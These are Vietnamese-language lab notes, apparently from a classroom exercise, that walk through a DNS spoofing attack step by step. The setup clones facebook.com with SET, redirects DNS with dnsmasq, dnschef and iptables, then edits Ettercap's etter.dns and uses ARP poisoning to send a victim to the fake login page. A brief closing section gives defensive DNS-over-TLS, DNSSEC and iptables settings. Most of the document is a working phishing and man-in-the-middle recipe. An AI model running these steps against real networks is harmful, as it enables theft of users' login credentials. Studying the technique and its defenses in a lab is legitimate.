### **TẤN CÔNG DNS SPOOFING**

##### **Trình tự**

Bước 1: setoolkit

&#x20;  ↓

Bước 2: dnsmasq

&#x20;  ↓

Bước 2: dnschef

&#x20;  ↓

Bước 3: Ettercap







##### **SE Toolkit - Cloner Web**

\# Dùng quyền sudo:

&#x09;setoolkit > 1 > 2 > 3 > 2



\# Nhập ip máy Kali: 192.168.40.129

\# Nhập url của website muốn clone: facebook.com



##### **DNSmasq**

\# Chạy dnsmasq

&#x09;systemctl status dnsmasq

&#x09;systemctl start dnsmasq \&\& systemctl enable dnsmasq



\# Spoof facebook.com → 192.168.40.129, forward mọi thứ còn lại về 8.8.8.8

&#x09;dnschef --fakeip 192.168.40.129 \\

&#x20;  	     --fakedomains facebook.com,www.facebook.com \\

&#x20;  	     --nameservers 8.8.8.8 \\

&#x20;  	     --interface 192.168.40.129



\# Redirect port 53 về dnschef



iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 \\

&#x20;        -j REDIRECT --to-port 53

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 \\

&#x20;        -j REDIRECT --to-port 53



##### **Ettercap**

\# Bật IP forwarding (bắt buộc)

&#x09;echo 1 | sudo tee /proc/sys/net/ipv4/ip\_forward 



\# Dùng quyền root mở file /etc/ettercap/etter.conf

\# Sửa 2 giá trị thành 0



\# Tiếp tục với etc/ettercap/etter.dns

*#* Thêm dòng sau vào cuối file (xóa comment cũ nếu có)

&#x09;facebook.com A 192.168.40.129     # IP của máy Kali

&#x09;www.facebook.com A 192.168.40.129

&#x09;\*.facebook.com A 192.168.40.129



\# Mở ettercap đồ họa:		ettercap -G

\# STOP, quét host, vào host list

\# Chọn ip máy victim, thêm vào target

\# Bật ARP Posioning, START



##### **Victim**

\# Flush web cache

&#x09;sudo resolvectl flush-caches

\# Quét nsloookup:

&#x09;nslookup facebook.com

\# Truy cập trình duyệt và kiểm tra



### **PHÒNG CHỐNG BẰNG DNSSEC**



\# ***Phương án 1:*** Dùng DNS-over-HTTPS / DNS cố định (chặn DNS giả)

\# Ngay cả khi bị ARP poison, nếu DNS được mã hóa thì dnschef không intercept được.

Cài systemd-resolved với DoH:

&#x09;sudo nano /etc/systemd/resolved.conf

&#x09;	\[Resolve]

&#x09;	DNS=1.1.1.1 8.8.8.8

&#x09;	FallbackDNS=9.9.9.9

&#x09;	DNSOverTLS=yes

&#x09;	DNSSEC=yes

&#x09;sudo systemctl restart systemd-resolved



&#x20;***# Phương án 2:*** Lock DNS bằng iptables — chỉ cho phép DNS từ server tin cậy:

\# Chặn mọi DNS request đến nơi khác (port 53)

&#x09;sudo iptables -A OUTPUT -p udp --dport 53 ! -d 1.1.1.1 -j DROP

&#x09;sudo iptables -A OUTPUT -p tcp --dport 53 ! -d 1.1.1.1 -j DROP

